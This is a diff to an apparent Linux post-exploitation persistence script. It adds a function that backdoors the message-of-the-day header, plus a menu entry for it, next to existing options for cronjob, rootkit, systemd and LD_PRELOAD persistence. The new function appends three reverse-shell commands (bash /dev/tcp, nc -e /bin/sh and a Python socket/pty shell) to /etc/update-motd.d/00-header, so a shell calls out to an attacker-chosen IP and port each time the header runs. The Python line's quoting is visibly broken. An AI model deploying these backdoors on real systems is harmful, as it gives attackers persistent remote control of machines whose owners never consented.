@@ -141,6 +141,14 @@ rcePersistence() {
     php -S 0.0.0.0:$PORT & 
 }
 
+MessageOfTheDay() {
+    read -p "Enter your python location? " pythonv
+    echo "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" >> /etc/update-motd.d/00-header 
+    echo "nc -e /bin/sh $ip $port" >> /etc/update-motd.d/00-header 
+    echo "$pythonv -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'' >> /etc/update-motd.d/00-header"
+    
+}
+
 help() {
     echo -e "\e[1m
         ──────────────────────────────────────────────────
@@ -196,6 +204,7 @@ main() {
        2. Cronjob Persistence         5. LKM/Rootkit
        3. Custom User with Root       6. Bashrc Persistence 
        7. Systemd Service for Root    8. LD_PRELOAD Privilege Escalaion Config
+       9. Backdooring Message of the Day / Header 
        
        help for more information! 
        "
